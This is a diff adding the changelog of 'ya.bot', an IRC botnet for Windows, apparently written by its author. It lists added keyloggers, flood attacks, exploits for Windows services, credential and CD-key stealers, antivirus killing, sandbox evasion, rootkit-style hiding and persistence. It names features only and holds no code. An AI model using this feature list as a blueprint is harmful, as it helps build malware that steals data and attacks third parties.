@@ -1,0 +1,200 @@
+/*  ya.bot  */
+
+0.3
+---
+49.		Added more sniff signatures.
+48.		Reduced memory usage from ~4mb to ~200kb with SetProcessWorkingSetSize() API.
+47.		Made persist also lock file.
+46.		Added new debugging functions.
+45.		Heavily modified SServerList struct.
+44.		Added Windows CD-Key snagger to snag_cdkeys(), gets and decrypts the key.
+43.		Updated crypto tool to support rot47.
+42.		Made botkiller controlable through commands instead.
+41.		Made linker switch changes to wormride project too.
+40.		Added /G6 switch to linker, optimizes code for pentium processors.
+39.		Did some linker switch changes so same variables dont point to same address. You can now
+		encrypt different variables with same valus without corruption.
+38.		Fixed and removed some antidebug functions.
+37.		Changed melt function.
+36.		Fixed wormride unloading bug.
+35.		Added snag.clipboard, snags clipboard data
+34.		Added extended botnick option, will show uptime, connection, os and country in nick.
+33.		Added rot147 communcation.
+32.		Added wormride control.
+31.		Added botinstallasservice variable, because keylogger wont work if bot runs as a service
+		due to the service running in a different user context. If botinstallasservice is not used,
+		regular Run startup is used instead.
+30.		Fixed a bug with http speedtest and added some more sites.
+29.		Updated heurestic detection notes.
+28.		Added USB scanner.
+27.		Added more bad ips/host to badipsandhosts[].
+26.		Added checkiphost(), checks for bad ips & hosts
+25.		Added http shellcode.
+24.		Extended sandbox detection.
+23.		Removed NO_INJECT define and made inject part of core.
+22.		Fixed bug with keylogger.
+21.		Made so you cant use more than 64 sockets for scanner, to avoid false
+		results as FD_SETSIZE is 64 under Windows. Thus you shouldnt use more sockets.
+20.		Removed all exploits, gonna walk through them all and then readd due to
+		instability.
+19.		Added extended error report from transfer_directtransfer().
+18.		Added port 139 support to fphost(). 
+17.		Added document on how to config bot.
+16.		Added "infected on" info to system info.
+15.		Added #define _WSPIAPI_COUNTOF so that bot compiles with new SDK.
+14.		Encrypted ring0.cpp.
+13.		Added RealVNC NULL authentication scanner.
+12.		Added pstorec.dll to \libraries\ folder, so snag_storage can be compiled under
+		Win2k.
+11.		Added notes to defines.h on what modules are detected by AV heuristics methods.
+10.		Fixed mIRC scan message bug.
+9.		Bot can now DCC GET and SEND at the same time.
+8.		Fixed a bug with bot.system.
+7.		Added Norman sandbox detector.
+6.		Added NOD32 sandbox detector.
+5.		Added DCC send function, bot can now send files to users.
+4.		Added DCC recv function, a logged in user can send files to bot.
+3.		Added SYN/ACK (+ LAND when spoofed) flood.
+2.		Added UDP flood.
+1.		Added keylogger.
+
+0.2
+---
+70.		Added snag.all command.
+69.		Fixed some bugs with persist thread and kill/removal of bot.
+68.		Made a uptime function that uses performance counters instead of GetTickCount(), so it can
+		show uptimes past 49,7 days.
+67.		Added persistance inject code, restarts bot remotely from explorer.exe if bot is
+		killed.
+66.		Added mIRC scanner.
+65.		Fixed speed issues with raw transfer.
+64.		Changed expscan.stats to scan.stats
+63.		Fixed speed issues with FTP and HTTP daemon.
+62.		Added HTTP daemon.
+61.		Added ftp functions (download/update/upload).
+60.		Fixed some of the registry functions.
+59.		Made so botkiller kills any process that is running 64 or more threads.
+58.		Added disconnect command.
+57.		Added ip check to info_goodbot(), now bot also needs to have a non-private IP to get
+		prefixed with an [X].
+56.		Made -d parameter global for parser and commands, so now you can delay any command.
+55.		Added Andvare's kclass unit (ring0.cpp), lets you enter ring0 in WinXP via a SE_DEBUG_NAME
+		"exploit". Unhooking and hiding of process code included, very nice stuff.
+54.		Added -d parameter to http download/update.
+53.		Made so FTPd startup/shutdown is controlled from irc_connect() instead of
+		expscan_main().
+52.		Extended botkiller to remove registry startups.
+51.		Made so driver and botservice are loaded in safe mode.
+50.		Added driver installer/uninstaller.
+49.		Added Bandwith flood.
+48.		Added Troll flood.
+47.		Added UPNP exploit, NOT TESTED.
+46.		Added WarFTPd exploit, NOT TESTED.
+45.		Added Optix exploit.
+44.		Added WebDav exploit, NOT TESTED.
+43.		Added rxbot exploit.
+42,		Added PNP over port 139 exploit, NOT TESTED.
+41.		Updated snag cdkeys.
+40.		Added driver to project.
+39.		Removed some unnecessary error checks in expscan.
+38.		Added rot13 crypto.
+37.		Added avkiller.
+36.		Added botkiller.
+35.		Removed mutex uninstaller and disabled dll unlinking in wormride, using static base address
+		instead for easier removal.
+34.		Added mutex uninstaller for wormride.
+33.		Changed to a Extended Overwriting API hook engine in wormride using xde.
+32.		Added DNS resolver command.
+31.		Added tcpip patcher.
+30.		Added function to get file size.
+29.		Added bindshell shellcode.
+28.		Added custom recv() function to exploits, expscan_recv(), non-blocking.
+27.		Added another VM detector, universal.
+26.		Added E-Mail snagger.
+25.		Added Wormride installer/uninstaller code.
+24.		Added DLL injection functions.
+23.		Encrypted strngs in Wormride library.
+22.		Added SOCKS4 daemon.
+21.		Added DameWare exploit, NOT TESTED.
+20.		Added WinMsgr exploit.
+19.		Added registry startup as backup in case service install fails.
+18.		Added Wormride library to project workspace.
+17.		Added MySQL UDF exploit.
+16.		Added MyUDF library to project workspace.
+15.		Changed way expscan passes info parameters, so now exploits use the existing connected
+		socket instead of creating a new connection.
+14.		Added smtp scanner.
+13.		Added ftp scanner.
+12.		Added weak cisco exploit, NOT TESTED.
+11.		Added FTP daemon.
+10.		Added fake settings.
+9.		Added currently scanning command.
+8.		Added transfer stats command.
+7.		Added WKS exploit, NOT TESTED.
+6.		Added ASN1 exploit.
+5.		Added SMB exploit.
+4.		Added DCOM exploit.
+3,		Added PNP exploit.
+2.		Added LSASS exploit.
+1.		Added new melt function.
+
+0.1
+---
+55.		Added exploit scanner.
+54.		Added transfer code.
+53.		Added SHA-256 hashing algorithm.
+52.		Added RC4 encryption.
+51.		Added upload and execute shellcode.
+50.		Added packet sniffer.
+49.		Added case insensitive string search function.
+48.		Added MSN Messenger user info snagger.
+47.		Added filefinding code.
+46.		Replaced patch downloading code with port 445 disabling code in secure_main().
+45.		Added verbose parameter.
+44.		Added logic module.
+43.		Added speedtest.
+42.		Added multi topic command support.
+41.		Fixed "topic threaded command parameter structure corruption" bug.
+40.		Made so you have to give botpassword as a parameter to update command.
+39.		Added netutils.cpp which includes various network functions.
+38.		Added tcpip.h.
+37.		ALL strings are now encrypted.
+36.		Added secure_main().
+35.		Added system() command.
+34.		Fixed antidebug_vmware() crash bug.
+33.		Added antidebug_breakpoint() and antidebug_checkforbreakpoints().
+32.		Added antidebug_procdump().
+31.		Added antidebug_softice().
+30.		Added info_os().
+29.		Added password storage snagger.
+28.		Added cd-key snagger.
+27.		Added registry functions.
+26.		Added http download and update.
+25.		Added process kill by pid.
+24.		Added process list.
+23.		Added process start.
+22.		Made so you have to give botpassword as a parameter to remove command.
+21.		Extended the information given by bot.info.
+20.		Added info_goodbot(), if bot meets minimum criteria
+		(2GHz, 512MB RAM, 40GB HD, +14 days uptime) it will get prefixed with an [X].
+		If criteria is not met but the bot has +14 days uptime it will get prefixed with
+		[<days>].
+19.		Added ident daemon.
+18.		Added anti-debug code.
+17.		Added function to clear system logs.
+16.		Added function to get privileges.
+15.		Added netinfo command.
+14.		Fixed a bug with login.
+13.		Added info functions.
+12.		Added file open and file delete commands.
+11.		Added raw command.
+10.		Added remove command.
+9.		Added melt function.
+8.		Added file functions.
+7.		Added service install/uninstall code.
+6.		Fixed and optimized stuff in irc_parseline().
+5.		Added thread commands.
+4.		Added colors.
+3.		Added some basic commands.
+2.		Added string encryption.
+1.		Coded base, conncets and responds to ping/version.
